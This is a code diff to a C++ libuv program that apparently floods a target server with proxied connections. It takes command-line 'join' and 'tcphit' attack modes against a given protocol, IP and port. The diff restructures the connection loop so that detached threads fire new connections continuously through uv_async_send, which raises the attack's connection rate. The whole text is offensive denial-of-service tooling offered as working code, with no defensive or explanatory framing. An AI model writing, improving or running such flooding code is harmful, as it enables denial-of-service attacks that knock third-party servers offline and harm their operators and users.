@@ -107,8 +107,6 @@ void connect(uv_loop_t* loop) {
   conn->data = dstAddr;
   uv_tcp_connect(conn, psock,
                  (const sockaddr*) dstAddr, [](uv_connect_t* con, int s) {
-                   connect(con->handle->loop);
-
                    auto* dstAddr = (sockaddr_in*) con->data;
                    if (s < 0) {
                      DELETE_GOVNOPROXY
@@ -147,7 +145,7 @@ void connect(uv_loop_t* loop) {
                  });
 }
 
-int main(int argc, char** argv) {
+[[noreturn]] int main(int argc, char** argv) {
   if (argc < 5) {
     std::cerr << "Нот энаугхт аргументс!!11!" << std::endl;
     exit(-1);
@@ -163,7 +161,7 @@ int main(int argc, char** argv) {
 
   if (strcmp(argv[2], "join") == 0) {
     attack = new JoinAttack(protocol, ip, port);
-  } else if(strcmp(argv[2], "tcphit") == 0) {
+  } else if (strcmp(argv[2], "tcphit") == 0) {
     attack = new TcpHitAttack(protocol);
   } else {
     std::cout << argv[2] << " из нот а валид аттак!1!!" << std::endl;
@@ -197,15 +195,29 @@ int main(int argc, char** argv) {
   signal(SIGPIPE, SIG_IGN);// Ignore SIGPIPE
 
   for (int i = 0; i < loopCnt; i++) {
-    std::thread([=]() {
-      auto* loop = (uv_loop_t*) malloc(sizeof(uv_loop_t));
-      uv_loop_init(loop);
+    auto* loop = (uv_loop_t*) malloc(sizeof(uv_loop_t));
+    uv_loop_init(loop);
 
-      for (int i = 0; i < 4; i++) {
-        connect(loop);
+    std::thread([=]() {
+      while (!uv_loop_alive(loop));
+
+      auto* async = (uv_async_t*) malloc(sizeof(uv_async_t));
+      uv_async_init(loop, async, [](uv_async_t* async) {
+        connect(async->loop);
+      });
+
+      while (uv_loop_alive(loop)) {
+        uv_async_send(async);
       }
 
+      free(async);
+    }).detach();
+
+    std::thread([=]() {
+      connect(loop);
+
       uv_run(loop, UV_RUN_DEFAULT);
+      uv_loop_close(loop);
       free(loop);
     }).detach();
   }
